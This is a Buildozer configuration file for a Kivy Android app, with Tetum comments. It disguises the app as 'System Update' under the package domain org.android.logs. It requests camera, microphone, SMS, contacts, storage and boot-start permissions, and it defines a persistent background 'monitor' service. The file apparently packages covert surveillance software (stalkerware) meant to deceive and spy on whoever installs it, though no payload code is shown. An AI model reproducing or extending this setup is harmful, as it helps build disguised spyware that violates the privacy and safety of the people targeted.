[app]
# Naran app nian ne'ebé sei mosu iha HP
title = System Update
package.name = sysupdate
package.domain = org.android.logs
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# Requirements importante husi image_55ccd7.png
requirements = python3,kivy,requests,opencv-python,pyjnius

# Permisaun kompletu ba Kamera no Background husi image_55ccd7.png
android.permissions = INTERNET, CAMERA, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK

orientation = portrait
fullscreen = 0
android.arch = armeabi-v7a
android.api = 33

# Service hodi app la'o nafatin iha background (image_55ccd7.png)
android.services = monitor:main.py

[buildozer]
log_level = 2
warn_on_root = 1
